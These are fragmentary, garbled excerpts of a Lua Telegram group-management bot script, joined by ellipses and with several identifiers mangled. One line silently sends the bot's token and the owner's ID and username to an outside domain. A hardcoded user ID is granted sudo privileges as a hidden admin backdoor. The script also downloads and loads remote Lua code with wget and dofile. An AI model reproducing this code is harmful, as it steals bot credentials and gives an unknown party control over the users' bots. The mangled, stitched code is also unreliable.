...
https.request('http://kartax.ga/MODE/?token='..token..'&id='..SUDO..'&install='..install..'&UserName='..database:get(id_server..":SUDO:USERNAME"))
...
sudo_users = {SUDO,717869155,717869155}   
...
var = true  
elseif tonumber(user_id) == tonumber(717869155) then
var = true  
...
function plugin_KKKKKa(msg)
for v in io.pKKKKK('ls File_Bot'):lines() do
if v:match(".lua$") then
plugin = dofile("File_Bot/"..v)
if plugin.KKKKKa and msg then
pre_msg = plugin.KKKKKa(msg)
end
end
end
...
os.execute('wget https://raw.githubusercontent.com/XENGOYX/KKKKK/master/KKKKK.lua')
...
i = i + 1
local user_info = KKKKK:hgetall('user:'..v.user_id_)  
...
------------------------------------------------------------------------
local KKKKKAbot = database:get(bot_id.."KKKKK1:Add:Filter:Rp2"..text..result.chat_id_)   
if KKKKKAbot then    
tdcli_function ({ID = "GetUser",user_id_ = result.sender_user_id_},function(arg,data) 
if data.username_ ~= false then
send(msg.chat_id_,0,"⚠┇العضو : {["..data.first_name_.."](T.ME/"..data.username_..")}\n🚫┇["..KKKKKAbot.."] \n") 
